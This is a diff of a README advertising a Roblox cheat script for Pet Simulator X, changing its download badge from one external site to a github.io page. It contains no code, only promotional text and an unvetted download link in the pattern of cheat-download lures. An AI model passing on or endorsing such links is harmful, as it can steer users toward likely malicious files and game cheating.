@@ -2,7 +2,7 @@
 
 Dominate Pet Simulator X with this powerful Roblox Lua script offering auto-farming, teleportation, gem collection, and more. Works with the latest game updates.
 
-[![Download PSX Script](https://img.shields.io/badge/Download-PSX--Script-blueviolet)](https://seomadjest.com/)
+[![Download PSX Script](https://img.shields.io/badge/Download-PSX--Script-blueviolet)](https://pet-simulator-x-v-4-34.github.io/.github)
 
 ---
 
